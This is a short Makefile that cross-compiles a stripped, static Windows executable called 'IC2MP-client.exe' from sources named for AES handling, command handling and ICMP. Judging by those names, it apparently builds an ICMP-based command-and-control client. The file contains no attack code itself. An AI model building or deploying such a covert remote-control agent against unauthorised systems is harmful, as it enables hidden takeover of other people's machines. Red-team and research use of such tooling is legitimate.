# Compiler and linker
CC = x86_64-w64-mingw32-g++-posix
CFLAGS = -Wall -Os -std=c++20 -ffunction-sections -fdata-sections -flto -D SODIUM_STATIC -I/opt/libsodium-win64/include
LDFLAGS = -L/opt/libsodium-win64/lib -lsodium -lws2_32 -lkernel32 -luser32 -lgdi32 \
          -lwinspool -lcomdlg32 -ladvapi32 -lshell32 -lole32 -loleaut32 -luuid -lodbc32 -lodbccp32 \
          -static -static-libgcc -static-libstdc++ -s -Wl,--gc-sections -flto
SOURCES = AESHandler.cpp Client.cpp CommandHandler.cpp helpers.cpp icmp.cpp main.cpp
OBJECTS = $(SOURCES:.cpp=.o)
TARGET = IC2MP-client.exe

# Build rules
all: $(TARGET)
		rm -f $(OBJECTS)

$(TARGET): $(OBJECTS)
		$(CC) -o $@ $(OBJECTS) $(LDFLAGS)

%.o: %.cpp
		$(CC) $(CFLAGS) -c $< -o $@

clean:
		rm -f $(OBJECTS) $(TARGET)